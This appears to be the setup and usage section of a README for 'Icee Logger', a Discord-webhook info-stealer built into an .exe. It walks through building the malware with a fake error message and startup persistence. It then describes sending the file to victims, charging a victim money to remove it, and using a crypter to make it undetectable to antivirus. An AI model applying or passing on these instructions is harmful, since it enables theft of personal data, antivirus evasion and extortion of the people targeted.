## <a id="setup"></a> ‚öôÔ∏è „Ä¢ Setting up Icee Logger

1. Install [Python 3.10.7](https://www.python.org/downloads/release/python-3107/)
  - If you are not a dummy just skip this part and downgrade Python to 3.10.x, this was tested on 3.10.7, it's highly recommended that you use it. For dummies who know nothing about Python then read this whole paragraph:
  - Make sure you check "Add to PATH" option!
  - If you already have Python Installed on your computer, please make sure you downgrade to 3.10.7, otherwise you will not be able to start the Builder!
  - If you don't know how to downgrade here is a brief guide: Open Cmd. Type `python --version`. If your version does not match 3.10.7 then go to [python.org](https://www.python.org/downloads). Find the current version of Python you are using (from the cmd command we used to see the currect version) and download the installer for that exact version. Once it's done - open the installer and click on `Uninstall`. You may be required to restart your computer. Once it's done, check the version again by opening Cmd and typing `python --version`. If you have any issues or a suggestion how to make this easier, please open an issue or pull request. (Or just DM me on Discord.)
2. Check if you have a stable internet connection. Once you have it proceed to the next step.
3. Go inside the `source` folder.
4. Open `BUILD.vbs`. Please make sure you open that file and NOT `builder.py`.
5. If you have the required Python version you will not see the interactive menu. Please enter your webhook and all settings you need. I recommend also using a custom image. To do that please convert an image to a `.ico` file, uploading a `.png` or any other file format will not work!
6. Once you selected all of your settings, feel free to test your WebHook or fake error/message.
7. Finally click on "Build".
8. Please do not close any of the windows while the program is running. Be patient and wait, it can take some time.
9. After all of that waiting, the program will automatically open the folder with the .exe file. Make sure not to close it.
12. You have your .exe file now! Enjoy :)

<details open>
<summary>In case you accidentally open the virus or you wish to test it. Please check this brief tutorial on how to remove it from your start-up. Of course if you checked the start-up option in the Builder!</summary>
<br>
Accidents do happen. In that case, immediately delete the WebHook messages in your Discord Server. (If someone else can see it.)
You might also wish to remove it from your start-up, else your information will be logged every time you start your computer.
To do that, press `Windows Key + R` on your keyboard at the same time. If you did it correctly, you will see the "Run" window open up. Inside the text area, type this: `shell:common startup` and then press enter. A folder will open. There you will see a file which ends with `.src`. That is the logger. The name starts with `screensaver` and ends with some random letters. For example: `screensaver_dkjfw7sdfk.src`. After you delete that file, you are completely safe. To be sure just restart your computer. Oh and yeah, if the victim you are targetting is willing to pay you money to remove the virus you can tell him to do this.

## <a id="usage"></a>‚ùì „Ä¢ How To Use?
- Once you have built the `.exe` file, you can now send it to other people. All that they have to do is download it and open it.
- If they say it has a virus or they anti-virus detects one then please don't worry. I'm working on a fix. It will be included in the main release soon.. If you are more experienced feel free to use [this tool](https://github.com/Blank-c/Blankrypt). It's highly recommended since it will remove most of the virus positives and will make it truly undetectable!
- Once again I'm saying that I'm working on a fix. It will be in the next release. Please use the tool if you know how!
